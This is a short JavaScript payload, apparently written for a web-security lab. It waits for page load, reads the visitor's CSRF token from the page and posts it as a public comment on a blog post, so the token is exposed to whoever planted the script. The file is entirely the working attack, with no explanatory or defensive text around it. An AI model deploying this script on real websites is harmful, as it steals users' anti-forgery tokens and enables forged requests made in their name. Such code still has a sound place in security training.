// To make sure that csrf token is fully generated
document.addEventListener('DOMContentLoaded', function(){
    var data = new FormData();

    var token = document.getElementsByName('csrf')[0].value;
    /*
    required Data:

    csrf=auto
    postId=y
    comment=z
    name=d
    email=f
    website=g
    */

    data.append('csrf', token);
    data.append('postId', 10);
    data.append('comment', `My csrf token please:${token}`);
    data.append('name', 'Victim');
    data.append('email','email@gmail.com')
    data.append('website', 'https://www.www.com')

    fetch('/post/comment', {
        method: 'POST',
        mode:   'no-cors',
        body:   data

    });

});